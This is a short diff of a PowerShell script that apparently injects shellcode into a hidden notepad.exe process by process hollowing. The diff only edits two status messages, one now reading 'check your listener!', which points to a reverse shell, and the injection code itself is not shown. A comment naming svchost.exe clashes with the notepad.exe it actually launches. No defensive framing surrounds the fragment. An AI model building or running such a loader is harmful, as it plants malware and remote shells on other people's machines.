@@ -5,7 +5,7 @@ if ([System.IntPtr]::Size -ne 8) {
 }
 
 # Step 2: Start svchost.exe in suspended mode
-Write-Host "Starting notepad.exe in suspended mode..."
+Write-Host "Starting notepad.exe..."
 $notepadProcess = Start-Process -FilePath "C:\Windows\System32\notepad.exe" -WindowStyle Hidden -PassThru -ArgumentList "/suspend"
 $procid = $notepadProcess.Id
 Write-Host "Started notepad.exe with PID: $procid"
@@ -92,7 +92,7 @@ if ($thread -eq [IntPtr]::Zero) {
 }
 else {
     [Kernel32]::ResumeThread($thread)
-    Write-Output "Shellcode injected via process hollowing successfully!"
+    Write-Output "Shellcode injected, check your listener!"
 }
 
 [Kernel32]::CloseHandle($hProcess)
